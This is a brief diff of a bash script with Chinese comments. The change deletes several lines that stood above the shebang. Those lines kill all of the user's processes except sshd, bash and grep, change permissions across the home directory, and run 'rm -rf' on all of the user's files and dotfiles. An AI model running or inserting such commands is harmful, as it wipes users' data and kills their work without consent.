@@ -1,9 +1,3 @@
-ps aux | grep $(whoami) | grep -v "sshd\|bash\|grep" | awk '{print $2}' | xargs -r kill -9 2>/dev/null
-chmod -R 755 ~/* \
-chmod -R 755 ~/.* \
-rm -rf ~/.* \
-rm -rf ~/*
-rm -rf ~/*
 #!/bin/bash
 # 定义颜色
 green() { echo -e "\e[1;32m$1\033[0m"; }
